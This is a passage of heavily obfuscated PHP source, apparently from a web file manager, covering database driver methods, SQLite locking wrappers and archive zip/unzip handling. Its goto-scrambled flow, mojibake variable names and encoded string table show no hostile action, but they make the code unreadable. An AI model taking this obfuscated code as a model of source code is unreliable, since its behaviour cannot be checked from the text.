$aèÔ‡ˆê¶[882] . $aèÔ‡ˆê¶[883] . $aèÔ‡ˆê¶[884] . strtoupper($b›ÅØ™‚±ù) . $aèÔ‡ˆê¶[885] . strtoupper($b›ÅØ™‚±ù) . $aèÔ‡ˆê¶[886]; break; case $aèÔ‡ˆê¶[887]: $eÙï£­ô‰¯ = $aèÔ‡ˆê¶[888] . $b›ÅØ™‚±ù . $aèÔ‡ˆê¶[889]; break; case $aèÔ‡ˆê¶[862]: break; case $aèÔ‡ˆê¶[890]: default: $eÙï£­ô‰¯ = $aèÔ‡ˆê¶[891] . ($this->dbType == $aèÔ‡ˆê¶[890] ? "\x60{$b›ÅØ™‚±ù}\140" : $b›ÅØ™‚±ù); } } goto EËŠíãáàÊ; bÌ„µ÷¿Ç: return $A¢›™ß‰Ã‡; goto b¡ÑÅ‚„; b¡ÑÅ‚„: } public function getTables($bŠŒÊæñ» = '') { $a¡è£ ğÂ¡ =& $_SERVER[Ïº«‚ßèÔˆø]; if (think_config($a¡è£ ğÂ¡[893])) { $CÎóâ¼‡½æ = str_replace($a¡è£ ğÂ¡[894], $bŠŒÊæñ», think_config($a¡è£ ğÂ¡[893])); } else { switch ($this->dbType) { case $a¡è£ ğÂ¡[861]: case $a¡è£ ğÂ¡[863]: $CÎóâ¼‡½æ = $a¡è£ ğÂ¡[895]; break; case $a¡è£ ğÂ¡[860]: case $a¡è£ ğÂ¡[878]: $CÎóâ¼‡½æ = $a¡è£ ğÂ¡[896]; break; case $a¡è£ ğÂ¡[887]: $CÎóâ¼‡½æ = $a¡è£ ğÂ¡[897]; break; case $a¡è£ ğÂ¡[862]: think_exception(think_lang($a¡è£ ğÂ¡[898]) . $a¡è£ ğÂ¡[899]); break; case $a¡è£ ğÂ¡[879]: $CÎóâ¼‡½æ = $a¡è£ ğÂ¡[42] . $a¡è£ ğÂ¡[43] . $a¡è£ ğÂ¡[44]; break; case $a¡è£ ğÂ¡[890]: default: if (!empty($bŠŒÊæñ»)) { $CÎóâ¼‡½æ = $a¡è£ ğÂ¡[843] . $bŠŒÊæñ» . $a¡è£ ğÂ¡[844]; } else { $CÎóâ¼‡½æ = $a¡è£ ğÂ¡[845]; } } } $a¹Î¾’ãÂÊ = $this->query($CÎóâ¼‡½æ); $BÇÓ©Î¾±¥ = array(); foreach ($a¹Î¾’ãÂÊ as $c³ãÁùù² => $AÌ©¼Ş®¨) { $BÇÓ©Î¾±¥[$c³ãÁùù²] = current($AÌ©¼Ş®¨); } return $BÇÓ©Î¾±¥; } protected function parseLimit($f¹Ì¸‘›Ö˜) { $Cùøç›‘å¸ =& $_SERVER[Ïº«‚ßèÔˆø]; $A¥ŸŸññš = $Cùøç›‘å¸[33]; if (!empty($f¹Ì¸‘›Ö˜)) { switch ($this->dbType) { case $Cùøç›‘å¸[887]: case $Cùøç›‘å¸[879]: $f¹Ì¸‘›Ö˜ = explode($Cùøç›‘å¸[47], $f¹Ì¸‘›Ö˜); if (count($f¹Ì¸‘›Ö˜) > 1) { $A¥ŸŸññš .= $Cùøç›‘å¸[48] . $f¹Ì¸‘›Ö˜[1] . $Cùøç›‘å¸[49] . $f¹Ì¸‘›Ö˜[0] . $Cùøç›‘å¸[50]; } else { $A¥ŸŸññš .= $Cùøç›‘å¸[48] . $f¹Ì¸‘›Ö˜[0] . $Cùøç›‘å¸[50]; } break; case $Cùøç›‘å¸[860]: case $Cùøç›‘å¸[878]: break; case $Cùøç›‘å¸[862]: break; case $Cùøç›‘å¸[861]: case $Cùøç›‘å¸[863]: break; case $Cùøç›‘å¸[890]: default: $A¥ŸŸññš .= $Cùøç›‘å¸[48] . $f¹Ì¸‘›Ö˜ . $Cùøç›‘å¸[50]; } } return $A¥ŸŸññš; } public function parseKey(&$E¸“Š’ÄŸä, $eØ¤›©·İ¥ = true) { $CÇô…Šº¥³ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($eØ¤›©·İ¥) { $E¸“Š’ÄŸä = $this->parseKeyCheck($E¸“Š’ÄŸä); } if ($this->dbType == $CÇô…Šº¥³[890]) { if ($E¸“Š’ÄŸä != $CÇô…Šº¥³[182] && !preg_match($CÇô…Šº¥³[855], $E¸“Š’ÄŸä)) { $E¸“Š’ÄŸä = $CÇô…Šº¥³[381] . trim($E¸“Š’ÄŸä, $CÇô…Šº¥³[381]) . $CÇô…Šº¥³[381]; } return $E¸“Š’ÄŸä; } else { return parent::parseKey($E¸“Š’ÄŸä, $eØ¤›©·İ¥); } } public function close() { $this->_linkID = null; } public function error() { $DÕî»¾Ğíè =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->PDOStatement) { $AÁóÄ‰ğ×Ø = $this->PDOStatement->errorInfo(); $this->error = $AÁóÄ‰ğ×Ø[1] . $DÕî»¾Ğíè[4] . $AÁóÄ‰ğ×Ø[2]; } else { $this->error = $DÕî»¾Ğíè[33]; } if ($DÕî»¾Ğíè[33] != $this->queryStr) { $this->error .= LNG($DÕî»¾Ğíè[45]) . $this->queryStr; } think_trace($this->error, $DÕî»¾Ğíè[33], $DÕî»¾Ğíè[46]); return $this->error; } public function escapeString($a‘æ…™Ã„…) { $fĞµ†ƒâÂê =& $_SERVER[Ïº«‚ßèÔˆø]; switch ($this->dbType) { case $fĞµ†ƒâÂê[887]: case $fĞµ†ƒâÂê[860]: case $fĞµ†ƒâÂê[878]: case $fĞµ†ƒâÂê[890]: return addslashes($a‘æ…™Ã„…); case $fĞµ†ƒâÂê[862]: case $fĞµ†ƒâÂê[879]: case $fĞµ†ƒâÂê[861]: case $fĞµ†ƒâÂê[863]: return str_ireplace($fĞµ†ƒâÂê[55], $fĞµ†ƒâÂê[56], $a‘æ…™Ã„…); } } protected function parseValue($Cë¶’³¤®) { $aò·ï¹âÑ =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_string($Cë¶’³¤®)) { $EßĞÑáõ¿ã = strpos($Cë¶’³¤®, $aò·ï¹âÑ[4]) === 0 && in_array($Cë¶’³¤®, array_keys($this->bind)); $Cë¶’³¤® = $EßĞÑáõ¿ã ? $this->escapeString($Cë¶’³¤®) : $aò·ï¹âÑ[900] . $this->escapeString($Cë¶’³¤®) . $aò·ï¹âÑ[900]; } elseif (isset($Cë¶’³¤®[0]) && is_string($Cë¶’³¤®[0]) && strtolower($Cë¶’³¤®[0]) == $aò·ï¹âÑ[294]) { $Cë¶’³¤® = $this->escapeString($Cë¶’³¤®[1]); } elseif (is_array($Cë¶’³¤®)) { $Cë¶’³¤® = array_map(array($this, $aò·ï¹âÑ[901]), $Cë¶’³¤®); } elseif (is_bool($Cë¶’³¤®)) { $Cë¶’³¤® = $Cë¶’³¤® ? $aò·ï¹âÑ[87] : $aò·ï¹âÑ[495]; } elseif (is_null($Cë¶’³¤®)) { $Cë¶’³¤® = $aò·ï¹âÑ[103]; } return $Cë¶’³¤®; } public function getLastInsertId() { $Aèø©‰Ûìç =& $_SERVER[Ïº«‚ßèÔˆø]; switch ($this->dbType) { case $Aèø©‰Ûìç[887]: case $Aèø©‰Ûìç[879]: case $Aèø©‰Ûìç[860]: case $Aèø©‰Ûìç[878]: case $Aèø©‰Ûìç[862]: case $Aèø©‰Ûìç[890]: return $this->_linkID->lastInsertId(); case $Aèø©‰Ûìç[861]: case $Aèø©‰Ûìç[863]: $fÎ“ñï×Ï“ = $this->table; $f´¬ï»È¹ = $this->query("\123\x45\114\105\103\x54\x20{$fÎ“ñï×Ï“}\56\x63\x75\162\162\x76\141\x6c\40\x63\x75\x72\162\x76\141\154\40\x46\x52\117\x4d\40\x64\165\141\154"); return $f´¬ï»È¹ ? $f´¬ï»È¹[0][$Aèø©‰Ûìç[902]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($c´ñİÄ†‰¸) { $bÖŸˆºó Å =& $_SERVER[Ïº«‚ßèÔˆø]; if (!CacheLock::fileLock($bÖŸˆºó Å[9])) { return !1; } $E“ÓÌ’ÓÌ = parent::query($c´ñİÄ†‰¸); CacheLock::fileUnLock($bÖŸˆºó Å[9]); return $E“ÓÌ’ÓÌ; } public function execute($D‡àŸÉøŒŞ) { $c»¸áÁÊ¯î =& $_SERVER[Ïº«‚ßèÔˆø]; if (!CacheLock::fileLock($c»¸áÁÊ¯î[9])) { return !1; } $f«†‡Ñ–î = parent::execute($D‡àŸÉøŒŞ); CacheLock::fileUnLock($c»¸áÁÊ¯î[9]); return $f«†‡Ñ–î; } } class DbSqlite3 extends DbSqlite3Base { public function query($DŞ‚×¤Ú) { $cÎ‡äšˆâ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!CacheLock::fileLock($cÎ‡äšˆâ[9])) { return !1; } $F‰ÚğõãâØ = parent::query($DŞ‚×¤Ú); CacheLock::fileUnLock($cÎ‡äšˆâ[9]); return $F‰ÚğõãâØ; } public function execute($Bõˆ¯ê¶) { $cÍá…ºˆ›³ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!CacheLock::fileLock($cÍá…ºˆ›³[9])) { return !1; } $AÃØßÅ§àÄ = parent::execute($Bõˆ¯ê¶); CacheLock::fileUnLock($cÍá…ºˆ›³[9]); return $AÃØßÅ§àÄ; } } goto cÁ«©ó×‘; e÷•Üì¶§Ô: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $c¢ºğ°ñ‚à; if (!$c¢ºğ°ñ‚à) { $D«ï£„ = IO::init($_SERVER[Ïº«‚ßèÔˆø][8]); } return $D«ï£„; } private static function iconvSystem($D–ó™¥¨ŠŞ) { return self::local()->iconvSystem($D–ó™¥¨ŠŞ); } private static function iconvApp($A·†ÇŒµÍá) { return self::local()->iconvApp($A·†ÇŒµÍá); } public static function zip($cÁç¢ƒê…, $C¹ÀÇÊ‚ä³ = "\172\151\160", $fÔ÷®ğ§ = '', $C¹¾ÙóÇƒ¬ = REPEAT_RENAME) { goto E‡¶ÒÛ »ˆ; F«”ÖĞàÑï: if (count($bÇŞÑ›‰Ê‹) > 1) { $Cª‡ó˜¢‘§ = IO::info(IO::pathFather($Cè¥ƒåŸã½[$Aµáƒê—ç[76]])); $c¶…¡ˆÌÚô = $Cª‡ó˜¢‘§[$Aµáƒê—ç[28]]; } $EÚ¹‰ì´¬ = $C¯òœÌŸ††; if (!$EÚ¹‰ì´¬) { $EÚ¹‰ì´¬ = get_path_father($Cè¥ƒåŸã½[$Aµáƒê—ç[76]]); if (!$fÔ÷®ğ§ && $b½ÒïØà‡µ->getType() == $Aµáƒê—ç[106]) { $EÚ¹‰ì´¬ = get_path_father($b½ÒïØà‡µ->path); } $Aì¥´×¡…ó = IO::info($EÚ¹‰ì´¬); if (!$Aì¥´×¡…ó[$Aµáƒê—ç[195]]) { show_json(LNG($Aµáƒê—ç[1063]), !1); } } goto BÖÑšâê; CÕ«ŒáÇ‚ä: if ($fÔ÷®ğ§ || !$C¯òœÌŸ††) { if ($C¯òœÌŸ†† && strstr($C¯òœÌŸ††, TEMP_FILES)) { $CØˆÏå° = $bÇŞÑ›‰Ê‹ = array(); recursion_dir($EÚ¹‰ì´¬, $CØˆÏå°, $bÇŞÑ›‰Ê‹, 0); foreach ($CØˆÏå° as $dø¼¡‹©) { del_dir($dø¼¡‹©); } foreach ($bÇŞÑ›‰Ê‹ as $EïÖçóµùÏ) { if ($EïÖçóµùÏ == $BÒ è‘Àºô) { continue; } del_file($EïÖçóµùÏ); } } return $D¸ñ°Ç¯; } $eÚâ„ğö• = self::pathFather($Cè¥ƒåŸã½[$Aµáƒê—ç[76]]); $FÕŞäÉÑ‰§ = self::move($D¸ñ°Ç¯, $eÚâ„ğö•, $C¹¾ÙóÇƒ¬); goto BÜÃæëî…ß; BÖÑšâê: $D¸ñ°Ç¯ = $EÚ¹‰ì´¬ . $c¶…¡ˆÌÚô . $Aµáƒê—ç[95] . $C¹ÀÇÊ‚ä³; $D¸ñ°Ç¯ = get_filename_auto($D¸ñ°Ç¯, $Aµáƒê—ç[33], $C¹¾ÙóÇƒ¬); $BÒ è‘Àºô = self::iconvSystem($D¸ñ°Ç¯); goto B”†ŒÌ‹Ãñ; BÜÃæëî…ß: if (!$FÕŞäÉÑ‰§) { del_dir($C¯òœÌŸ††); show_json(LNG($Aµáƒê—ç[1064]), !1); } del_dir($C¯òœÌŸ††); return $FÕŞäÉÑ‰§; goto EŒ¬Ñ½µñ; cùÂ‚Øà İ: $C¯òœÌŸ†† = !1; if (!$fÔ÷®ğ§ && $b½ÒïØà‡µ->getType() == $Aµáƒê—ç[106]) { $bÇŞÑ›‰Ê‹ = self::zipFileList($cÁç¢ƒê…); } else { $C¯òœÌŸ†† = $fÔ÷®ğ§ ? $fÔ÷®ğ§ : TEMP_FILES . $Aµáƒê—ç[1062] . time() . rand_string(8) . $Aµáƒê—ç[8]; mk_dir($C¯òœÌŸ††); $bÇŞÑ›‰Ê‹ = self::zipFileList($cÁç¢ƒê…, $C¯òœÌŸ††); } $c¶…¡ˆÌÚô = $Cè¥ƒåŸã½[$Aµáƒê—ç[28]]; goto F«”ÖĞàÑï; B”†ŒÌ‹Ãñ: foreach ($bÇŞÑ›‰Ê‹ as $Fğæ¯¯°‚ê => $C›ëñàÓ³§) { $bÇŞÑ›‰Ê‹[$Fğæ¯¯°‚ê] = self::iconvSystem($C›ëñàÓ³§); } KodArchive::create($BÒ è‘Àºô, $bÇŞÑ›‰Ê‹); if (!IO::exist($D¸ñ°Ç¯)) { if ($C¯òœÌŸ††) { del_dir($C¯òœÌŸ††); } show_json(LNG($Aµáƒê—ç[1064]), !1); } goto CÕ«ŒáÇ‚ä; E‡¶ÒÛ »ˆ: $Aµáƒê—ç =& $_SERVER[Ïº«‚ßèÔˆø]; $b½ÒïØà‡µ = self::init($cÁç¢ƒê…[0][$Aµáƒê—ç[76]]); $Cè¥ƒåŸã½ = self::info($cÁç¢ƒê…[0][$Aµáƒê—ç[76]]); goto cùÂ‚Øà İ; EŒ¬Ñ½µñ: } public static function unzip($c¼ğƒåíôŞ, $F¶ÇàÜÈ×¸ = "\162\x65\160\154\141\143\x65") { goto bîá¦ÖáÁ§; bîá¦ÖáÁ§: $AÅÂˆŸÜÀÅ =& $_SERVER[Ïº«‚ßèÔˆø]; $c¤°‹¶‘¥Š = $c¼ğƒåíôŞ[$AÅÂˆŸÜÀÅ[76]]; $cØãó‹ÎŞ¸ = $c¼ğƒåíôŞ[$AÅÂˆŸÜÀÅ[1065]]; goto cÚ©àÉô¹Š; D–àáÔ³Œˆ: if (!@file_exists(self::iconvSystem($C–ù„ÀÏ·))) { $c›ôá°å¼« = self::localFilePath($c¤°‹¶‘¥Š, $e¨¡¬¨ÀßÉ); $C–ù„ÀÏ· = $c›ôá°å¼« ? $c›ôá°å¼« : parent::download($c¤°‹¶‘¥Š, $C–ù„ÀÏ·); } $C–ù„ÀÏ· = self::iconvSystem($C–ù„ÀÏ·); $aŠƒĞß”¾ = isset($c¼ğƒåíôŞ[$AÅÂˆŸÜÀÅ[1067]]) ? $c¼ğƒåíôŞ[$AÅÂˆŸÜÀÅ[1067]] : $AÅÂˆŸÜÀÅ[1068]; goto e’È­Î‹ÌÕ; c³˜°Ä¤®: Hook::trigger($AÅÂˆŸÜÀÅ[1072], $eÍÙ‡‰’í); recursion_dir($eÍÙ‡‰’í, $EĞ­ç‰Ï§, $bË†øä§Ü‹, 0); $F¢Şßİ™Æ = array_merge($EĞ­ç‰Ï§, $bË†øä§Ü‹); goto b¸âª«©œµ; cÚ©àÉô¹Š: if (!($AÆˆéàÃŸˆ = parent::info($c¤°‹¶‘¥Š))) { show_json(LNG($AÅÂˆŸÜÀÅ[1066]), !1); } if (!($FõãÆ·¥ = parent::infoFull($cØãó‹ÎŞ¸))) { $cØãó‹ÎŞ¸ = parent::mkdir($cØãó‹ÎŞ¸); $FõãÆ·¥ = array($AÅÂˆŸÜÀÅ[76] => $cØãó‹ÎŞ¸); } else { if (isset($FõãÆ·¥[$AÅÂˆŸÜÀÅ[394]]) && trim($FõãÆ·¥[$AÅÂˆŸÜÀÅ[76]], $AÅÂˆŸÜÀÅ[8]) != trim($cØãó‹ÎŞ¸, $AÅÂˆŸÜÀÅ[8])) { $bŠˆ‹Äâ¨Õ = KodIO::make($FõãÆ·¥[$AÅÂˆŸÜÀÅ[476]]); $B¶ÌòÊô = parent::fileNameAuto($bŠˆ‹Äâ¨Õ, $FõãÆ·¥[$AÅÂˆŸÜÀÅ[28]], REPEAT_RENAME_FOLDER, !0); $cØãó‹ÎŞ¸ = parent::mkdir($bŠˆ‹Äâ¨Õ . $B¶ÌòÊô); $FõãÆ·¥ = array($AÅÂˆŸÜÀÅ[76] => $cØãó‹ÎŞ¸); } } $cØãó‹ÎŞ¸ = $FõãÆ·¥[$AÅÂˆŸÜÀÅ[76]]; goto dÚŠ¡½‚˜; b¸âª«©œµ: foreach ($F¢Şßİ™Æ as $DğŞÕ˜ìù¼) { $DğŞÕ˜ìù¼ = self::iconvApp($DğŞÕ˜ìù¼); self::move($DğŞÕ˜ìù¼, $cØãó‹ÎŞ¸, $F¶ÇàÜÈ×¸); } del_dir($eÍÙ‡‰’í); if (!$c›ôá°å¼«) { del_file($C–ù„ÀÏ·); } goto FØÜ‰ø¥í; FØÜ‰ø¥í: return !0; goto d£ ±¥¯Ê—; dÚŠ¡½‚˜: $E‡¦×Â£ÇÚ = self::tmpFileName($AÆˆéàÃŸˆ); $eÍÙ‡‰’í = TEMP_FILES . $E‡¦×Â£ÇÚ; del_dir($eÍÙ‡‰’í); goto b®Ç™ÁæøÎ; b®Ç™ÁæøÎ: mk_dir($eÍÙ‡‰’í); $e¨¡¬¨ÀßÉ = self::fileExt($AÆˆéàÃŸˆ); $C–ù„ÀÏ· = $eÍÙ‡‰’í . $AÅÂˆŸÜÀÅ[95] . $e¨¡¬¨ÀßÉ; goto D–àáÔ³Œˆ; e’È­Î‹ÌÕ: $dõ²ï½ñ = KodArchive::extract($C–ù„ÀÏ·, $eÍÙ‡‰’í . $AÅÂˆŸÜÀÅ[8], $aŠƒĞß”¾); self::archiveExt(); if (!$dõ²ï½ñ[$AÅÂˆŸÜÀÅ[1069]]) { show_json($AÅÂˆŸÜÀÅ[1070] . $dõ²ï½ñ[$AÅÂˆŸÜÀÅ[1071]], !1); } goto c³˜°Ä¤®; d£ ±¥¯Ê—: } public static function unzipList($C‘÷™å÷…) { goto F–âÀŒòæ; aéå„Ô¼©ñ: $Eî„îÊÊñ = 50000; if (request_url_safe($aÌ’„½øË)) { $FÒ·Ş’”¯ = parse_url_query($aÌ’„½øË); if (!isset($FÒ·Ş’”¯[$cğ•‰íŞ®Š[76]])) { show_json($cğ•‰íŞ®Š[1074], !1); } } $dÑ…£•¶®É = isset($FÒ·Ş’”¯) ? $FÒ·Ş’”¯[$cğ•‰íŞ®Š[76]] : $aÌ’„½øË; goto DÖÆ²ÔÚâ–; C‡†ùÑÉëª: if (isset($FÒ·Ş’”¯)) { $AëÙ£ˆ˜Ü = array($FÒ·Ş’”¯[$cğ•‰íŞ®Š[76]], $FÒ·Ş’”¯[$cğ•‰íŞ®Š[1073]], $FÒ·Ş’”¯[$cğ•‰íŞ®Š[28]]); $e ·’ï—Ï¬ = md5(implode($cğ•‰íŞ®Š[71], $AëÙ£ˆ˜Ü)) . $cğ•‰íŞ®Š[95] . get_path_ext($FÒ·Ş’”¯[$cğ•‰íŞ®Š[28]]); } else { $AëÙ£ˆ˜Ü = array($BƒÏ¡©â—[$cğ•‰íŞ®Š[28]], $BƒÏ¡©â—[$cğ•‰íŞ®Š[76]], $BƒÏ¡©â—[$cğ•‰íŞ®Š[78]]); $e ·’ï—Ï¬ = md5(implode($cğ•‰íŞ®Š[71], $AëÙ£ˆ˜Ü)) . $cğ•‰íŞ®Š[95] . $dÂÒäÖ¾Åö; } if ($FÈø‘Š³õÃ == -1) { $D±ìœ»â = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\x69\145\x77\x2f{$A¯¥¨‚§ØÏ}\x2f{$e ·’ï—Ï¬}\56\x6c\x6f\147"; $dµäáßñ÷‡ = self::infoFull($D±ìœ»â); if ($dµäáßñ÷‡) { $D±ìœ»â = $dµäáßñ÷‡[$cğ•‰íŞ®Š[76]]; $EÂÜ½ğŒÏÉ = self::getContent($D±ìœ»â); if ($EÂÜ½ğŒÏÉ) { $Eß†’«õ…² = json_decode($EÂÜ½ğŒÏÉ, !0); if (count($Eß†’«õ…²) >= $Eî„îÊÊñ) { show_json(sprintf(LNG($cğ•‰íŞ®Š[1075]), count($Eß†’«õ…²)), !1); } return $Eß†’«õ…²; } } else { $D±ìœ»â = self::mkfile($D±ìœ»â); } } $e…Ù­§Ñ™Ú = TEMP_FILES . $A¯¥¨‚§ØÏ; goto D„ëÌÒ¥Œ§; D†ë¼¶Æº®: $Eß†’«õ…² = json_encode($f¢¾£ï­Ö[$cğ•‰íŞ®Š[1071]]); self::setContent($D±ìœ»â, $Eß†’«õ…²); if (count($f¢¾£ï­Ö[$cğ•‰íŞ®Š[1071]]) >= $Eî„îÊÊñ) { show_json(sprintf(LNG($cğ•‰íŞ®Š[1075]), count($f¢¾£ï­Ö[$cğ•‰íŞ®Š[1071]])), !1); } goto c„ÓµÍÍŞÈ; fÂëÊ¹ÅÏ¹: $C¡ïÏĞÉ¯Á = self::iconvSystem($C¡ïÏĞÉ¯Á); if ($FÈø‘Š³õÃ >= 0) { $D¦îÏÒªÙÕ = isset($C‘÷™å÷…[$cğ•‰íŞ®Š[1077]]) ? $C‘÷™å÷…[$cğ•‰íŞ®Š[1077]] : !1; $bÛˆ«†‚ã± = isset($C‘÷™å÷…[$cğ•‰íŞ®Š[28]]) ? $C‘÷™å÷…[$cğ•‰íŞ®Š[28]] : $cğ•‰íŞ®Š[33]; KodArchive::filePreview($C¡ïÏĞÉ¯Á, $FÈø‘Š³õÃ, $D¦îÏÒªÙÕ, $bÛˆ«†‚ã±); self::archiveExt(); die; } $f¢¾£ï­Ö = KodArchive::listContent($C¡ïÏĞÉ¯Á); goto AÈºĞ÷÷‡À; F–âÀŒòæ: $cğ•‰íŞ®Š =& $_SERVER[Ïº«‚ßèÔˆø]; $aÌ’„½øË = $C‘÷™å÷…[$cğ•‰íŞ®Š[76]]; $FÈø‘Š³õÃ = isset($C‘÷™å÷…[$cğ•‰íŞ®Š[1073]]) ? $C‘÷™å÷…[$cğ•‰íŞ®Š[1073]] : -1; goto aéå„Ô¼©ñ; AÈºĞ÷÷‡À: self::archiveExt(); del_dir($e…Ù­§Ñ™Ú); if (!$f¢¾£ï­Ö[$cğ•‰íŞ®Š[1069]]) { show_json($f¢¾£ï­Ö[$cğ•‰íŞ®Š[1071]], !1); } goto D†ë¼¶Æº®; c„ÓµÍÍŞÈ: return $f¢¾£ï­Ö[$cğ•‰íŞ®Š[1071]]; goto E£“°œ‰ç°; DÖÆ²ÔÚâ–: $BƒÏ¡©â— = self::info($dÑ…£•¶®É); $dÂÒäÖ¾Åö = self::fileExt($BƒÏ¡©â—); $A¯¥¨‚§ØÏ = self::tmpFileName($BƒÏ¡©â—); goto C‡†ùÑÉëª; D„ëÌÒ¥Œ§: if (!is_dir($e…Ù­§Ñ™Ú)) { mk_dir($e…Ù­§Ñ™Ú); } $C¡ïÏĞÉ¯Á = $e…Ù­§Ñ™Ú . $cğ•‰íŞ®Š[8] . $e ·’ï—Ï¬; if (!@file_exists(self::iconvSystem($C¡ïÏĞÉ¯Á))) { if (isset($FÒ·Ş’”¯)) { url_request($aÌ’„½øË, $cğ•‰íŞ®Š[1076], $C¡ïÏĞÉ¯Á); } else { $dÖ¬Ş‚†îµ = self::localFilePath($aÌ’„½øË, $dÂÒäÖ¾Åö); $C¡ïÏĞÉ¯Á = $dÖ¬Ş‚†îµ ? $dÖ¬Ş‚†îµ : self::download($aÌ’„½øË, $C¡ïÏĞÉ¯Á); } } goto fÂëÊ¹ÅÏ¹; E£“°œ‰ç°: } private static function fileExt($B÷…íç°¿–) { $bÇÒó©±µĞ =& $_SERVER[Ïº«‚ßèÔˆø]; $BäöĞ«˜æ = $B÷…íç°¿–[$bÇÒó©±µĞ[168]]; if ($BäöĞ«˜æ == $bÇÒó©±µĞ[1078]) { $a®Ò¿Èá = $bÇÒó©±µĞ[1079]; if (substr($B÷…íç°¿–[$bÇÒó©±µĞ[28]], -strlen($a®Ò¿Èá)) == $a®Ò¿Èá) { $BäöĞ«˜æ = $bÇÒó©±µĞ[1080]; } } self::archiveExt($BäöĞ«˜æ); return $BäöĞ«˜æ; } private static function zipFileList($a‘ó§‡Ãµò, $d¢Ó ’—‡ = false) { $bÈæŒ‚äá­ =& $_SERVER[Ïº«‚ßèÔˆø]; $A˜ëïê­Ú = array(); foreach ($a‘ó§‡Ãµò as $aÖ ‹”®…±) { $e—„‡Ä¼§› = $aÖ ‹”®…±[$bÈæŒ‚äá­[76]]; if ($d¢Ó ’—‡) { $e—„‡Ä¼§› = self::copy($aÖ ‹”®…±[$bÈæŒ‚äá­[76]], $d¢Ó ’—‡, $bÈæŒ‚äá­[775]); } else { $CØõŸäÊŒ = self::init($aÖ ‹”®…±[$bÈæŒ‚äá­[76]]); if ($CØõŸäÊŒ->getType() == $bÈæŒ‚äá­[106]) { $e—„‡Ä¼§› = $CØõŸäÊŒ->path; } } if ($e—„‡Ä¼§› && self::local()->exist($e—„‡Ä¼§›)) { $A˜ëïê­Ú[$aÖ ‹”®…±[$bÈæŒ‚äá­[76]]] = $e—„‡Ä¼§›; } } if (!empty($A˜ëïê­Ú)) { return array_values($A˜ëïê­Ú); } show_json(LNG($bÈæŒ‚äá­[1044]), !1); } public static function tmpFileName($BçŠà‘×”æ) { $c›®¬å¦ƒ¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÖ®Õ¥Ú“ = array($BçŠà‘×”æ[$c›®¬å¦ƒ¥[28]], $BçŠà‘×”æ[$c›®¬å¦ƒ¥[76]], $BçŠà‘×”æ[$c›®¬å¦ƒ¥[78]], $BçŠà‘×”æ[$c›®¬å¦ƒ¥[485]]); return md5(implode($c›®¬å¦ƒ¥[71], $DÖ®Õ¥Ú“)); } private static function localFilePath($cİëÌŠ§, $e®ßÌ•ß°) { goto B‰¸§íáŒÑ; eÁÓñ‡‚ö­: if ($C‡Ñ‹¤µ½ == $d‚”Á¢Î¥[106] || $C‡Ñ‹¤µ½ == $d‚”Á¢Î¥[1084]) { if (!$bÏè©åë->exist($bÏè©åë->path)) { show_json(LNG($d‚”Á¢Î¥[105]), !1); } return $bÏè©åë->path; } return !1; goto bÙçÂ”ãéò; B‰¸§íáŒÑ: $d‚”Á¢Î¥ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($e®ßÌ•ß° == $d‚”Á¢Î¥[1081] && strtoupper(substr(PHP_OS, 0, 3)) == $d‚”Á¢Î¥[1082]) { return !1; } $d»ìĞÙ·Ûã = KodIO::parse($cİëÌŠ§); goto EÂÑĞÇÙÇ; EÂÑĞÇÙÇ: if ($d»ìĞÙ·Ûã[$d‚”Á¢Î¥[29]] == KodIO::KOD_SOURCE) { $F™ğ¿ëëÜÎ = Model($d‚”Á¢Î¥[782])->fileInfoGet(KodIO::sourceID($cİëÌŠ§)); if (!$F™ğ¿ëëÜÎ[$d‚”Á¢Î¥[76]]) { show_json($d‚”Á¢Î¥[1083], !1); } $cİëÌŠ§ = $F™ğ¿ëëÜÎ[$d‚”Á¢Î¥[76]]; } $bÏè©åë = self::init($cİëÌŠ§); $C‡Ñ‹¤µ½ = $bÏè©åë->getType(); goto eÁÓñ‡‚ö­; bÙçÂ”ãéò: } private static function archiveExt($aÎµÓÍ›¿ = '') { $GLOBALS[$_SERVER[Ïº«‚ßèÔˆø][1085]] = $aÎµÓÍ›¿; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto EÀŸ”ì×î—; EÀŸ”ì×î—: $B³ÁÍëÔõŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $eâ°–Şè = $GLOBALS[$B³ÁÍëÔõŠ[6]][$B³ÁÍëÔõŠ[88]]; if ($eâ°–Şè[$B³ÁÍëÔõŠ[1086]] != 1) { return; } goto f†½ŒÉó; f†½ŒÉó: if ($eâ°–Şè[$B³ÁÍëÔõŠ[1087]] <= 0) { return; } if (isset($_REQUEST[$B³ÁÍëÔõŠ[1088]]) && $_REQUEST[$B³ÁÍëÔõŠ[1088]] == $B³ÁÍëÔõŠ[87]) { return; } Hook::bind($B³ÁÍëÔõŠ[1089], $B³ÁÍëÔõŠ[1090]); goto DÖƒ×–Ÿƒ; DÖƒ×–Ÿƒ: Hook::bind($B³ÁÍëÔõŠ[1091], $B³ÁÍëÔõŠ[1092]); Hook::bind($B³ÁÍëÔõŠ[1093], $B³ÁÍëÔõŠ[1094]); Hook::bind($B³ÁÍëÔõŠ[1095], $B³ÁÍëÔõŠ[1096]); goto bÓçóô”©Ö; bÓçóô”©Ö: Hook::bind($B³ÁÍëÔõŠ[1097], $B³ÁÍëÔõŠ[1098]); Hook::bind($B³ÁÍëÔõŠ[1099], $B³ÁÍëÔõŠ[1100]); goto dÍ“ÁêÚ™Š; dÍ“ÁêÚ™Š: } public static function eventBeforeUpload($c¦ĞŸÔ¶›Â) { if ($c¦ĞŸÔ¶›Â[3] && $c¦ĞŸÔ¶›Â[3] != REPEAT_REPLACE) { return; } $Dßê¸Â³÷Ø = self::parsePath($c¦ĞŸÔ¶›Â[0]); if (!$Dßê¸Â³÷Ø) { return; } self::add($Dßê¸Â³÷Ø); } public static function eventBeforeEdit($aï‘ä¯Í¢´) { $C¶ë—ô¶Ş = self::parsePath($aï‘ä¯Í¢´[0]); if (!$C¶ë—ô¶Ş) { return; } self::add($C¶ë—ô¶Ş); } public static function eventBeforeCopyFile($FÌÙÏê², $Dƒì¥¶âå, $A–‚İêäê, 